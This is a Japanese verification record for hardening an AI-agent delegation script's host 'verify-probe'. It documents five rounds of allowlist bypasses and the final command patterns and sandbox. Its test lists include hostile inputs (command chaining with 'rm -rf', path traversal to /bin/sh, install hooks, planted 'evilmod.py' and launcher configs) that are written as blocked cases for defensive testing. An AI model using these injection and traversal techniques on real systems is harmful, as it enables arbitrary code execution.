# 検証記録: verify-probe のホスト実行に形式検査と環境遮断を入れる(Issue #43)

## 経緯: 検収 6 ラウンドで Critical が 5 件

このチケットは**設計の初版から 5 ラウンド連続で実機再現可能な Critical が出た**。
記録として残す価値があるのは、5 件すべてが**同じ誤りの形**だったこと:

> 「この形なら安全だろう」という**未検証の仮定**を許可リストに載せた。

| R | 指摘 | 何を仮定していたか | 実測での破れ方 |
| --- | --- | --- | --- |
| 1 | `npm install left-pad --version` が通る | 「第 1 トークンが安全なコマンドで、どこかに `--version` があれば版を出して終わる」 | サブコマンドが見られていない。postinstall / setup.py が走る |
| 2 | `python3 -m evilmod --version` で cwd の `evilmod.py` が走る | 「`-m` はインストール済みモジュールしか読まない」 | `python -m` は cwd を `sys.path` 先頭に入れる |
| 3 | `npx --no-install docs/../../../../bin/sh --version` で `/bin/sh` に到達 | 「パッケージ名の文字種を絞れば十分」 | `.` と `/` を許すと `..` でワークツリー外へ脱出する |
| 4 | `node version` で cwd の `version` ファイルが走る | 「`version` は導通確認トークン」 | 多くの処理系で「位置引数 = 実行するスクリプトのパス」。`rake` / `gradle` はファイル名の細工すら不要で `Rakefile` / `build.gradle` を評価する |
| 5 | `yarn --version` / `mvn --version` / `pnpm --version` が任意コードを実行 | 「`<cmd> --version` は版を出して終わる」 | ランチャーが cwd の設定を読んで**実行するコード自体を差し替える**(`.yarnrc` の `yarn-path` / `.mvn/jvm.config` の `-javaagent:` / `package.json` の `packageManager`) |

R6 は再現可能な RCE 経路 **なし**。残った Major 2 件はスペック整合(`-version` が Java 用と
説明されながら全コマンドに適用されていた / CHANGELOG に消したはずの `go version` 特例が残存)。

### ここから引くべき教訓

1. **許可リスト方式は「許可した要素が安全である」ことを別途実測しないと成立しない。**
   denylist を避けたのは正しかったが、許可リストに載せる判断自体が未検証なら同じこと。
   R5 の対応で `PROBE_ALLOWED_CMDS` を「この環境で実測して確認できた 8 つ」に絞り、
   **追加時の検証手順をスクリプトのコメントに書いた**(`design.md` §16.2)。これが本質的な修正。
2. **「安全そうな形」を増やすほど検証コストが増える。** P1/P2/P3 の 3 形 + `java -version` の
   特例まで絞ったが、形を 1 つ足すたびに R1〜R5 と同じ検証が要る。
   `go` / `cargo` / `deno` 等を外したのは、**検証できないものを載せない**という原則の適用。
3. **フェイルオープンの設計が救いになった。** 形式外は「警告 + スキップ」で委託自体は止まらない。
   許可リストを厳しくしても壊れるのは導通確認だけで、業務は止まらない。
   もし `exit` にしていたら、この厳格化は採れなかった。

## 採用しなかった指摘と理由

| 指摘 | 判断 | 理由 |
| --- | --- | --- |
| 空の隔離 tmpdir でプローブを実行する(R2) | **不採用** | 実測で空ディレクトリでは `npx --no-install eslint --version` が `npx canceled due to missing packages` で失敗する。プローブの目的は「**このプロジェクトの**ローカル依存が入っているか」なので、隔離すると恒常的に `exit 3` になる。要求 R2 と正面衝突 |
| `PROBE_ENV` にロケール変数を足す(R1) | 不採用 | 版を出すだけのコマンドに `LANG` は要らない。渡す変数は少ないほどよい |
| `npx --no-install <pkg>` の `node_modules/.bin` 解決(R2) | **受容(明記)** | プローブの正当な仕事と表裏一体で、形式検査では原理的に閉じられない。ワークツリー完全性の層(出口ハッシュ検査 / `check-guard-integrity.sh degraded` / #46)の担当。`design.md` §13.3・コメント・`AGENTS.md`・CHANGELOG に残存リスクとして明記した |

## 最終的な受理集合

- **P1**: `<cmd> --version`(cmd は `node npm npx python3 ruby java rake gradle` の完全一致)
- **P2**: `npx --no-install <npm名> --version`(`@scope/name` か `name`、`..` 不可)
- **P3**: `python3 -I -m <module> --version`(`[A-Za-z0-9_][A-Za-z0-9._]*`、`..` 不可)
- **特例**: `java -version` の完全一致 1 形のみ
- 実行環境: `env -i PATH=... COREPACK_ENABLE_NETWORK=0 [HOME] [TMPDIR] bash -c "$PROBE"`

## 検証結果(V1〜V38 / 司令塔が実機で全件実行)

手順: `AGENTS.md` の 86 行目のマーカーだけを line-targeted `sed` で差し替え →
`CODEX_DELEGATE_ACK_SECRETS=1 bash .claude/scripts/delegate-codex.sh impl /tmp/not-steering`
(入口検査5-1 で `exit 2` になるので codex を起動せずに入口検査3 の出力だけを観測できる)→
バックアップから `AGENTS.md` を復元。

**通る(12 件)**: `npx --no-install eslint --version` / `npx --no-install @scope/pkg --version` /
`node --version` / `npm --version` / `npx --version` / `python3 --version` /
`python3 -I -m pytest --version` / `ruby --version` / `rake --version` / `gradle --version` /
`java --version` / `java -version`

**ブロック(31 件)**: `curl ... --version` / `rm -rf --version` / `npm run lint` /
`npx eslint --version` / `npx --no-install eslint` / `... ; rm -rf /tmp/x` /
`npm install left-pad --version` / `pip install requests --version` /
`go run example.com/evil --version` / `cargo install ripgrep --version 1.0.0` /
`yarn add left-pad --version` / `npx --no-install docs/../../../../../../../bin/sh --version` /
`npx --no-install ../eslint --version` / `npx --no-install a/b/c --version` /
`python3 -I -m ..evil --version` / `python3 -m pytest --version` / `python3 -m evilmod --version` /
`node version` / `python3 version` / `ruby version` / `rake version` / `gradle version` /
`node -v` / `node --help` / `npm version` / `yarn --version` / `pnpm --version` / `mvn --version` /
`go version` / `cargo --version` / `deno --version` /
`ruby -version` / `rake -version` / `python3 -version` / `node -version` / `gradle -version` /
`python --version` / `python -I -m pytest --version`

**実体確認**: リポジトリ直下に `version`(node スクリプト)と `evilmod.py` を置いた状態で、
`node version` は `/tmp/pwned` を作らず、`python3 -I -m evilmod --version` は
`EVIL PY EXECUTED` を出さない(`-I` が効いている)。`; rm -rf` を含むプローブでは
canary ファイルが残る。

**許可コマンドの実測(R5 の対応)**: 作業ディレクトリに `.yarnrc` / `.npmrc` /
`package.json`(`prepare` + `packageManager`)/ `Rakefile` / `rakefile` / `settings.gradle` /
`build.gradle` / `gradle/init.gradle` / `gradle.properties` / `sitecustomize.py` /
`usercustomize.py` / `Gemfile` / `.mvn/jvm.config` を仕掛け、
`env -i PATH HOME COREPACK_ENABLE_NETWORK=0 bash -c '<cmd> --version'` を実行。
`node` `npm` `npx` `python3` `ruby` `java` `rake` `gradle` は canary を作らず。
`yarn` `mvn` `pnpm` は作った(または実行バイナリが差し替わった)ため除外した。

## 品質チェック

`bash -n .claude/scripts/delegate-codex.sh` OK / `prettier --check` OK /
`eslint` `tsc --noEmit` `vitest` OK(いずれも今回の変更対象外だが退行が無いことを確認)。
shellcheck は環境に未インストールのため未実行。

## 申し送り

- **`.claude/scripts/` は委託禁止領域**なので、このチケットは Codex に渡さず
  `implement-ticket` の fork(Sonnet)で実装した。Issue にもその旨が明記されていた
- **fork が §17 の検証フェーズ中に枠上限で中断**したため、V33〜V38 と V1〜V32 の
  退行確認は**司令塔が直接実行**した(実装自体は中断前に完了していた)
- 許可コマンドを増やすときは `design.md` §16.2 の検証手順を必ず回すこと。
  スクリプトのコメントにも同じことを書いてある
- `go` / `cargo` / `deno` / `bun` / `dotnet` / `php` / `composer` / `swift` / `pip` / `uv` /
  `poetry` / `bundle` は「検証できていない」ので外してある。**危険と判定したわけではない**。
  実測できる環境ができたら追加を検討してよい
